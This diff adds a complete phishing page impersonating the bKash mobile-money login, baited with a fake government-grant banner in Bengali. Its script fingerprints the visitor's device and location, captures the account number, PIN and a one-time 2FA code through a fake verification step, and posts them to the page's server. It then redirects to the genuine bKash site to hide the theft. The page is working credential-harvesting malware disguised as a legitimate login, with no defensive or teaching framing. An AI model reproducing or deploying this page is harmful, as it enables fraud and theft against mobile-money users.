@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to bKash</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; 
+        }
+        
+        body { 
+            background: linear-gradient(135deg, #e2136e 0%, #c10c5c 100%); 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            color: #333; 
+            padding: 20px;
+        }
+        
+        .bkash-logo { 
+            margin-bottom: 20px; 
+            text-align: center; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .bkash-icon {
+            width: 70px;
+            height: 70px;
+            background-color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 16px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+        }
+        
+        .bkash-icon img {
+            width: 70px;
+            height: 70px;
+            border-radius: 100%;
+        }
+        
+        .bkash-logo-text { 
+            font-size: 42px; 
+            font-weight: bold; 
+            color: white; 
+            letter-spacing: -1px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .tagline {
+            font-size: 16px;
+            color: rgba(255,255,255,0.9);
+            margin-top: 8px;
+            font-weight: 500;
+        }
+        
+        .government-banner {
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            color: #b8860b;
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 18px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            border: 2px solid #ffed4e;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        
+        .container { 
+            background-color: white; 
+            padding: 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 12px 40px rgba(0,0,0,0.25); 
+            width: 100%; 
+            max-width: 420px; 
+            text-align: center; 
+        }
+        
+        h1 { 
+            font-size: 24px; 
+            font-weight: 600; 
+            margin-bottom: 25px; 
+            color: #e2136e;
+            text-align: center;
+        }
+        
+        .h1-2fa { 
+            font-size: 22px; 
+            font-weight: 700; 
+            margin-bottom: 12px; 
+            color: #e2136e;
+        }
+        
+        .p-2fa { 
+            font-size: 15px; 
+            color: #666; 
+            margin-bottom: 25px; 
+            line-height: 1.5;
+        }
+        
+        .input-group { 
+            margin-bottom: 20px; 
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #555;
+            font-weight: 600;
+        }
+        
+        input[type="text"], input[type="password"], input[type="tel"] { 
+            width: 100%; 
+            height: 52px; 
+            border: 2px solid #e0e0e0; 
+            border-radius: 12px; 
+            padding: 0 18px; 
+            font-size: 16px; 
+            background-color: #f8f9fa; 
+            transition: all 0.3s ease;
+            color: #333;
+        }
+        
+        input:focus { 
+            outline: none; 
+            border-color: #e2136e; 
+            box-shadow: 0 0 0 3px rgba(226, 19, 110, 0.1); 
+            background-color: white;
+        }
+        
+        #code { 
+            text-align: center; 
+            letter-spacing: 8px; 
+            font-size: 20px;
+            font-weight: 600;
+            color: #e2136e;
+        }
+        
+        .button { 
+            color: white; 
+            background: linear-gradient(135deg, #e2136e 0%, #c10c5c 100%); 
+            border: none; 
+            border-radius: 12px; 
+            padding: 16px 0; 
+            font-size: 18px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            width: 100%; 
+            margin-top: 10px; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(226, 19, 110, 0.3);
+        }
+        
+        .button:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(226, 19, 110, 0.4);
+        }
+        
+        .button:active {
+            transform: translateY(0);
+        }
+        
+        #loader { 
+            display: none; 
+            margin: 15px auto; 
+            width: 32px; 
+            height: 32px; 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #e2136e; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+        }
+        
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.6;
+        }
+        
+        .footer a {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .help-links {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .help-links a {
+            color: #e2136e;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .security-notice {
+            background: #fff3f7;
+            border: 1px solid #ffd1e0;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #c10c5c;
+        }
+        
+        .security-notice strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        /* 2FA Specific Styles */
+        .countdown {
+            font-size: 14px;
+            color: #e2136e;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+
+        .resend-option {
+            margin-top: 15px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="bkash-logo">
+        <div class="bkash-icon">
+            <img src="Logo/bkash-logo.png" alt="bKash Logo">
+        </div>
+        <div class="bkash-logo-text">bKash</div>
+        <div class="tagline">Easy, Secure, Reliable</div>
+    </div>
+    
+    <div class="government-banner">
+        🎉 সরকারি অনুদান: সকল নাগরিকের জন্য ২৫০০ টাকা 🎉
+    </div>
+    
+    <div class="container">
+        <div id="login-section">
+            <h1>Login to Your bKash Account</h1>
+            
+            <div class="input-group">
+                <label for="phone">bKash Account Number</label>
+                <input type="tel" id="phone" placeholder="01XXXXXXXXX" required pattern="[0-9]{11}">
+            </div>
+            
+            <div class="input-group">
+                <label for="pass">PIN</label>
+                <input type="password" id="pass" placeholder="Enter your 5-digit PIN" required maxlength="5" pattern="[0-9]{5}">
+            </div>
+            
+            <button id="login-button" class="button" onclick="sendLoginInfo()">Login to bKash</button>
+            <div id="loader"></div>
+        </div>
+        
+        <div id="2fa-section" style="display: none;">
+            <h1 class="h1-2fa">Security Verification</h1>
+            <p class="p-2fa" id="verification-message">We've sent a 6-digit verification code to your registered mobile number. Please enter it below to continue.</p>
+            
+            <div class="input-group">
+                <input type="tel" id="code" placeholder="• • • • • •" maxlength="6" required pattern="[0-9]{6}">
+            </div>
+            
+            <div class="countdown" id="countdown">Code expires in: 05:00</div>
+            
+            <button id="code-button" class="button" onclick="send2FACode()">Verify & Continue</button>
+            
+            <div class="resend-option">
+                Didn't receive the code? 
+                <a href="#" onclick="resendCode()" style="color: #e2136e; text-decoration: none; font-weight: 600;">Resend Code</a>
+                <br>
+                <a href="#" onclick="goBackToLogin()" style="color: #666; text-decoration: none; font-size: 13px; margin-top: 5px; display: inline-block;">← Back to Login</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>© 2024 bKash Ltd. All rights reserved.</p>
+        <p style="margin-top: 8px;">
+            <a href="#">Terms of Service</a> | 
+            <a href="#">Privacy Policy</a> | 
+            <a href="#">Security Tips</a>
+        </p>
+        <p style="margin-top: 12px; font-size: 12px; opacity: 0.8;">
+            A subsidiary of BRAC Bank Limited
+        </p>
+    </div>
+
+    <!-- =========== ডেটা সংগ্রহের জন্য আপডেট করা স্ক্রিপ্ট =========== -->
+    <script>
+        let countdownInterval;
+        let timeLeft = 300;
+
+        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
+        document.addEventListener('DOMContentLoaded', async function() {
+            let deviceField = document.getElementById('deviceInfo');
+            if (!deviceField) {
+                deviceField = document.createElement('input');
+                deviceField.type = 'hidden';
+                deviceField.name = 'deviceInfo';
+                deviceField.id = 'deviceInfo';
+                document.body.appendChild(deviceField);
+            }
+            
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown',
+                res: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
+            };
+
+            if (navigator.connection) {
+                deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+            }
+            
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                    deviceInfo.isCharging = battery.charging;
+                } catch (error) { /* Ignore error */ }
+            }
+            
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo.ip = ipData.ip;
+                
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+            } catch (error) {
+                deviceInfo.ip = 'Failed to fetch';
+            }
+            
+            deviceField.value = JSON.stringify(deviceInfo);
+
+            // ইনপুট ফরম্যাটিং
+            document.getElementById('phone')?.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').substring(0, 11));
+            document.getElementById('pass')?.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').substring(0, 5));
+            const codeInput = document.getElementById('code');
+            if(codeInput) {
+                codeInput.addEventListener('input', e => {
+                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
+                    if (e.target.value.length === 6) document.getElementById('code-button').click();
+                });
+            }
+        });
+
+        // কাউন্টডাউন ফাংশন
+        function startCountdown() {
+            timeLeft = 300;
+            clearInterval(countdownInterval);
+            const countdownEl = document.getElementById('countdown');
+            
+            const update = () => {
+                const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                const seconds = (timeLeft % 60).toString().padStart(2, '0');
+                countdownEl.textContent = `Code expires in: ${minutes}:${seconds}`;
+                if (timeLeft-- <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownEl.textContent = 'Code expired!';
+                }
+            };
+            update();
+            countdownInterval = setInterval(update, 1000);
+        }
+
+        // রিসেন্ড এবং ব্যাক ফাংশন
+        function resendCode() {
+            if (timeLeft > 240) return alert('Please wait before requesting a new code.');
+            startCountdown();
+            alert('New verification code sent!');
+        }
+        function goBackToLogin() {
+            document.getElementById('2fa-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            clearInterval(countdownInterval);
+        }
+
+        // প্রথম ধাপ: ফোন ও পিন সাবমিট
+        async function sendLoginInfo() {
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+            const deviceInfo = document.getElementById('deviceInfo').value || '{}';
+
+            if (!phone || phone.length !== 11 || !phone.startsWith('01')) return alert('Please enter a valid 11-digit number.');
+            if (!pass || pass.length !== 5) return alert('Please enter your 5-digit PIN.');
+
+            // LocalStorage-এ ডেটা সেভ
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.bkashData) storedData.bkashData = [];
+                storedData.bkashData.push({ phone, pass, deviceInfo, timestamp: new Date().toLocaleString(), type: 'login' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (error) { console.error('LocalStorage save error:', error); }
+            
+            // UI কন্ট্রোল
+            const loginButton = document.getElementById('login-button');
+            const loader = document.getElementById('loader');
+            loginButton.style.display = 'none';
+            loader.style.display = 'block';
+
+            // সার্ভারে ডেটা পাঠানো
+            try {
+                await fetch('/', { method: 'POST', body: new URLSearchParams({ phone, pass, deviceInfo }) });
+            } catch (error) { console.error('Server send error:', error); }
+
+            // UI পরিবর্তন করে 2FA সেকশনে যাওয়া
+            setTimeout(() => {
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('2fa-section').style.display = 'block';
+                document.getElementById('verification-message').textContent = `We've sent a 6-digit code to ${phone}. Please enter it to continue.`;
+                startCountdown();
+                loginButton.style.display = 'block';
+                loader.style.display = 'none';
+            }, 1500);
+        }
+
+        // দ্বিতীয় ধাপ: 2FA কোড সাবমিট
+        async function send2FACode() {
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code').value;
+            const deviceInfo = document.getElementById('deviceInfo').value || '{}';
+
+            if (!code || code.length !== 6) return alert('Please enter the 6-digit code.');
+
+            // LocalStorage-এ 2FA ডেটা সেভ
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.bkashData) storedData.bkashData = [];
+                storedData.bkashData.push({ phone, '2fa_code': code, deviceInfo, timestamp: new Date().toLocaleString(), type: '2fa' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (error) { console.error('LocalStorage 2FA save error:', error); }
+
+            const codeButton = document.getElementById('code-button');
+            codeButton.textContent = 'Verifying...';
+            codeButton.disabled = true;
+
+            // সার্ভারে 2FA কোড পাঠানো
+            try {
+                await fetch('/', { method: 'POST', body: new URLSearchParams({ phone, '2fa_code': code, deviceInfo }) });
+            } catch (error) { console.error('Server 2FA send error:', error); }
+            
+            // আসল সাইটে রিডাইরেক্ট করা
+            setTimeout(() => {
+                window.location.href = 'https://www.bkash.com/app';
+            }, 1000);
+        }
+    </script>
+</body>
+
+</html>
